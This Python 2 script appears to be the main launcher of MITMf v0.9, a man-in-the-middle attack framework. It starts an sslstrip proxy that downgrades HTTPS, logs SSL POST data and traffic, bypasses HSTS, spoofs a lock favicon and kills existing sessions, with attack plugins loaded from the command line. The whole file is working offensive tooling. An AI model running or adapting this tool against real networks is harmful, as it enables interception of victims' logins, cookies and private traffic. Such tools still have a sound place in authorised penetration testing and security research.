#!/usr/bin/env python

from twisted.web import http
from twisted.internet import reactor

from libs.sslstrip.CookieCleaner import CookieCleaner
from libs.sslstrip.ProxyPlugins import ProxyPlugins

import sys, logging, traceback, string, os
import argparse


from plugins import *
plugin_classes = plugin.Plugin.__subclasses__()

mitmf_version = "0.9"
sslstrip_version = "0.9"
sergio_version = "0.2.1"

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="MITMf v%s - Framework for MITM attacks" % mitmf_version, epilog="Use wisely, young Padawan.",fromfile_prefix_chars='@')
    #add sslstrip options
    sgroup = parser.add_argument_group("sslstrip", "Options for sslstrip library")
    sgroup.add_argument("-w", "--write", type=argparse.FileType('w'), metavar="filename", default=sys.stdout, help="Specify file to log to (stdout by default).")
    sgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level [default: info]")
    slogopts = sgroup.add_mutually_exclusive_group()
    slogopts.add_argument("-p", "--post", action="store_true",help="Log only SSL POSTs. (default)")
    slogopts.add_argument("-s", "--ssl", action="store_true", help="Log all SSL traffic to and from server.")
    slogopts.add_argument("-a", "--all", action="store_true", help="Log all SSL and HTTP traffic to and from server.")
    #slogopts.add_argument("-c", "--clients", action='store_true', default=False, help='Log each clients data in a seperate file') #not fully tested yet
    sgroup.add_argument("-l", "--listen", type=int, metavar="port", default=10000, help="Port to listen on (default 10000)")
    sgroup.add_argument("-f", "--favicon", action="store_true", help="Substitute a lock favicon on secure requests.")
    sgroup.add_argument("-k", "--killsessions", action="store_true", help="Kill sessions in progress.")
    sgroup.add_argument('-d', '--disable-proxy', dest='disproxy', action='store_true', default=False, help='Disable the SSLstrip Proxy')
    sgroup.add_argument("-b", "--bypass-hsts", dest='hsts', action="store_true", help="Enable HSTS bypass")

    #Initialize plugins
    plugins = []
    try:
        for p in plugin_classes:
            plugins.append(p())
    except:
        print "Failed to load plugin class %s" % str(p)

    #Give subgroup to each plugin with options
    try:
        for p in plugins:
            if p.desc == "":
                sgroup = parser.add_argument_group("%s" % p.name,"Options for %s." % p.name)
            else:
                sgroup = parser.add_argument_group("%s" % p.name,p.desc)

            sgroup.add_argument("--%s" % p.optname, action="store_true",help="Load plugin %s" % p.name)
            if p.has_opts:
                p.add_options(sgroup)
    except NotImplementedError:
        print "Plugin %s claimed option support, but didn't have it." % p.name

    args = parser.parse_args()

    log_level = logging.__dict__[args.log_level.upper()]

    #Start logging 
    logging.basicConfig(level=log_level, format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S", stream=args.write)

    #All our options should be loaded now, pass them onto plugins
    print "[*] MITMf v%s started... initializing plugins and modules" % mitmf_version
    load = []
    try:
        for p in plugins:
            if  getattr(args, p.optname):
                p.initialize(args)
                load.append(p)
    except NotImplementedError:
        print "Plugin %s lacked initialize function." % p.name

    #Plugins are ready to go, start MITMf
    if args.disproxy:
        ProxyPlugins.getInstance().setPlugins(load)

    elif args.hsts:
        from libs.sslstrip.StrippingProxyHSTS import StrippingProxy
        from libs.sslstrip.URLMonitorHSTS import URLMonitor

        URLMonitor.getInstance().setFaviconSpoofing(args.favicon)
        CookieCleaner.getInstance().setEnabled(args.killsessions)
        ProxyPlugins.getInstance().setPlugins(load)

        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy

        reactor.listenTCP(args.listen, strippingFactory)

        print "\n[*] sslstrip v%s by Moxie Marlinspike running..." % sslstrip_version
        print "[*] sslstrip+ by Leonardo Nve running..."
        print "[*] sergio-proxy v%s online..." % sergio_version
        
    else:
        from libs.sslstrip.StrippingProxy import StrippingProxy
        from libs.sslstrip.URLMonitor import URLMonitor

        args.clients = False # temporary
        URLMonitor.getInstance().setValues(args.favicon, args.clients)
        CookieCleaner.getInstance().setEnabled(args.killsessions)
        ProxyPlugins.getInstance().setPlugins(load)

        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy

        reactor.listenTCP(args.listen, strippingFactory)

        print "\n[*] sslstrip v%s by Moxie Marlinspike running..." % sslstrip_version
        print "[*] sergio-proxy v%s online" % sergio_version

    reactor.run()

    #cleanup on exit
    for p in load:
        p.finish()
